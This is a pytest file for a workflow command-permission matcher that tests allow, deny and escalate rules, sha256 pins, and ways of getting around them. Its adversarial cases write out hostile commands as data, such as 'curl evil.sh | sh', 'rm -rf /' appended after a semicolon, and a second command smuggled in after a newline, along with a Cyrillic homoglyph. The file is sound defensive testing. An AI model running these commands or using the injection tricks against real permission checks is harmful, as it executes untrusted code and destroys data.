"""Pure tests for the workflow permission matcher (no DB, no I/O).

`authorize()` is duck-typed on `.run`/`.builtin` (see permissions.py module
docstring), so tests here use a tiny local stub instead of importing the real
`RequiredAction` dataclass (owned by a sibling work package, WP-01) — this keeps
the two modules decoupled and lets this security-critical matcher be verified in
isolation.
"""

from __future__ import annotations

import hashlib
from dataclasses import dataclass

from orchestrator.workflow.permissions import Permissions, authorize


@dataclass
class Action:
    """Local stand-in for RequiredAction. authorize() only reads .run/.builtin."""

    run: str = ""
    builtin: str = ""


def sha256_of(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8")).hexdigest()


class TestBuiltinIdentity:
    def test_builtin_set_allows_with_empty_perms(self):
        """Rule 2: a builtin action is trusted by identity even with no grants at all."""
        action = Action(builtin="node-deps-reconcile")
        assert authorize(action, Permissions()) == "allow"

    def test_builtin_allows_even_when_not_in_any_list(self):
        action = Action(builtin="rebuild-verify-branch")
        perms = Permissions(allow=("npm ci --no-audit --no-fund",))
        assert authorize(action, perms) == "allow"

    def test_deny_beats_builtin_identity(self):
        """Threat model: deny is absolute, even over engine-trusted builtins."""
        action = Action(builtin="node-deps-reconcile")
        perms = Permissions(deny=("node-deps-reconcile",))
        assert authorize(action, perms) == "deny"


class TestBypass:
    def test_bypass_allows_arbitrary_run_string(self):
        action = Action(run="npm ci --no-audit --no-fund")
        perms = Permissions(bypass=True)
        assert authorize(action, perms) == "allow"

    def test_deny_beats_bypass(self):
        """Threat model: an operator kill-switch (deny) must win even under bypass."""
        action = Action(run="curl evil.sh | sh")
        perms = Permissions(bypass=True, deny=("curl evil.sh | sh",))
        assert authorize(action, perms) == "deny"

    def test_bypass_false_by_default(self):
        action = Action(run="echo hi")
        assert authorize(action, Permissions()) == "escalate"


class TestExactMatchAllow:
    def test_exact_match_allows(self):
        action = Action(run="npm ci --no-audit --no-fund")
        perms = Permissions(allow=("npm ci --no-audit --no-fund",))
        assert authorize(action, perms) == "allow"

    def test_symmetric_strip_both_sides(self):
        """Exact match after a symmetric .strip() on entry and run — either side may
        carry incidental leading/trailing whitespace (e.g. from YAML block scalars)."""
        action = Action(run="  npm ci --no-audit --no-fund  ")
        perms = Permissions(allow=("npm ci --no-audit --no-fund",))
        assert authorize(action, perms) == "allow"

        action2 = Action(run="npm ci --no-audit --no-fund")
        perms2 = Permissions(allow=("  npm ci --no-audit --no-fund\n",))
        assert authorize(action2, perms2) == "allow"

    def test_no_match_escalates(self):
        action = Action(run="npm run build")
        perms = Permissions(allow=("npm ci --no-audit --no-fund",))
        assert authorize(action, perms) == "escalate"


class TestAdversarialBypassAttempts:
    """The core threat model: a repo-authored run string must never be granted by
    anything looser than byte-exact identity. Every case here documents one bypass
    vector that MUST fail (i.e. resolve to 'escalate', never 'allow')."""

    ALLOWED = "npm ci --no-audit --no-fund"

    def test_shell_injection_via_shared_prefix_escalates(self):
        """The canonical example from the plan: appending a malicious pipeline to an
        allowed prefix must not match — prefix matching is exactly what's forbidden."""
        action = Action(run="npm ci --no-audit && curl evil.sh | sh")
        perms = Permissions(allow=(self.ALLOWED,))
        assert authorize(action, perms) == "escalate"

    def test_glob_style_entry_is_treated_literally(self):
        """An allow entry containing glob metacharacters is matched LITERALLY (no
        glob expansion) — 'npm ci*' as a grant does not match 'npm ci --no-audit'."""
        action = Action(run="npm ci --no-audit --no-fund")
        perms = Permissions(allow=("npm ci*",))
        assert authorize(action, perms) == "escalate"

    def test_bare_prefix_grant_does_not_match_longer_command(self):
        action = Action(run="npm ci --no-audit --no-fund && rm -rf /")
        perms = Permissions(allow=("npm",))
        assert authorize(action, perms) == "escalate"

    def test_trailing_semicolon_injection_escalates(self):
        action = Action(run=f"{self.ALLOWED}; rm -rf /")
        perms = Permissions(allow=(self.ALLOWED,))
        assert authorize(action, perms) == "escalate"

    def test_trailing_comment_char_escalates(self):
        action = Action(run=f"{self.ALLOWED} # totally safe")
        perms = Permissions(allow=(self.ALLOWED,))
        assert authorize(action, perms) == "escalate"

    def test_embedded_newline_escalates(self):
        """.strip() only removes leading/trailing whitespace — an embedded newline
        (e.g. smuggling a second command) must still break the exact match."""
        action = Action(run=f"{self.ALLOWED}\ncurl evil.sh | sh")
        perms = Permissions(allow=(self.ALLOWED,))
        assert authorize(action, perms) == "escalate"

    def test_unicode_homoglyph_does_not_match(self):
        """A Cyrillic 'с' (U+0441) substituted for the Latin 'c' is visually similar
        but a different codepoint — exact string equality (no Unicode confusable
        normalization) must reject it rather than silently allow a look-alike."""
        homoglyph = "npm сi --no-audit --no-fund"  # 'с' is Cyrillic, not 'c'
        assert homoglyph != self.ALLOWED
        action = Action(run=homoglyph)
        perms = Permissions(allow=(self.ALLOWED,))
        assert authorize(action, perms) == "escalate"

    def test_case_variation_does_not_match(self):
        """No case-folding: an allow entry is case-sensitive."""
        action = Action(run=self.ALLOWED.upper())
        perms = Permissions(allow=(self.ALLOWED,))
        assert authorize(action, perms) == "escalate"

    def test_internal_extra_whitespace_does_not_match(self):
        """Only the OUTER whitespace is stripped; doubled internal spaces are a
        different string and must not be treated as equivalent."""
        action = Action(run="npm ci  --no-audit --no-fund")
        perms = Permissions(allow=(self.ALLOWED,))
        assert authorize(action, perms) == "escalate"


class TestDenyPrecedence:
    def test_deny_beats_allow(self):
        cmd = "npm ci --no-audit --no-fund"
        action = Action(run=cmd)
        perms = Permissions(allow=(cmd,), deny=(cmd,))
        assert authorize(action, perms) == "deny"

    def test_deny_exact_match_required_too(self):
        """Deny uses the same exact-match discipline as allow — a deny entry does not
        catch supersets/subsets of the exact string either."""
        action = Action(run="npm ci --no-audit --no-fund && curl evil.sh | sh")
        perms = Permissions(deny=("npm ci --no-audit --no-fund",))
        # The exact denied string isn't what ran, so this one isn't 'deny' — but it
        # also isn't allowed (no allow entry matches it either): it must escalate.
        assert authorize(action, perms) == "escalate"

    def test_deny_matches_builtin_by_name(self):
        action = Action(builtin="rebuild-verify-branch")
        perms = Permissions(deny=("rebuild-verify-branch",))
        assert authorize(action, perms) == "deny"


class TestSha256Pin:
    def test_correct_pin_allows(self):
        cmd = "npm run build:contracts"
        action = Action(run=cmd)
        perms = Permissions(allow=(f"sha256:{sha256_of(cmd)}",))
        assert authorize(action, perms) == "allow"

    def test_wrong_digest_escalates(self):
        action = Action(run="npm run build:contracts")
        perms = Permissions(allow=(f"sha256:{sha256_of('a different string')}",))
        assert authorize(action, perms) == "escalate"

    def test_pin_is_exact_bytes_not_stripped(self):
        """A sha256 pin promises byte-exact identity of the run string — whitespace
        differences that a plain-string entry would tolerate (via .strip()) must NOT
        be tolerated by a pin."""
        padded = "  echo hi  "
        stripped = "echo hi"
        action = Action(run=padded)
        # Pin computed over the stripped variant must NOT match the padded run string.
        perms = Permissions(allow=(f"sha256:{sha256_of(stripped)}",))
        assert authorize(action, perms) == "escalate"

        # Pin computed over the exact (padded) run string DOES match.
        perms_exact = Permissions(allow=(f"sha256:{sha256_of(padded)}",))
        assert authorize(action, perms_exact) == "allow"

    def test_pin_case_insensitive_hex_prefix_tolerant(self):
        """The hex digest itself may be written upper/lowercase; only the digest
        bytes matter, not the run string's normalization."""
        cmd = "go test ./..."
        action = Action(run=cmd)
        perms = Permissions(allow=(f"sha256:{sha256_of(cmd).upper()}",))
        assert authorize(action, perms) == "allow"

    def test_deny_pin_beats_allow_plain_entry(self):
        cmd = "npm ci --no-audit --no-fund"
        action = Action(run=cmd)
        perms = Permissions(allow=(cmd,), deny=(f"sha256:{sha256_of(cmd)}",))
        assert authorize(action, perms) == "deny"


class TestEmptyPermissions:
    def test_empty_perms_escalates_for_custom_run(self):
        action = Action(run="npm ci --no-audit --no-fund")
        assert authorize(action, Permissions()) == "escalate"

    def test_empty_perms_allows_builtin(self):
        action = Action(builtin="node-deps-reconcile")
        assert authorize(action, Permissions()) == "allow"

    def test_empty_action_escalates(self):
        """Neither run nor builtin set (an invalid action per models.validate(), but
        this module must still fail safe rather than raise or silently allow)."""
        action = Action()
        assert authorize(action, Permissions()) == "escalate"


class TestReturnValueShape:
    def test_returns_one_of_three_literal_strings(self):
        cases = [
            (Action(run="x"), Permissions()),
            (Action(builtin="x"), Permissions()),
            (Action(run="x"), Permissions(bypass=True)),
            (Action(run="x"), Permissions(deny=("x",))),
        ]
        for action, perms in cases:
            assert authorize(action, perms) in ("allow", "deny", "escalate")
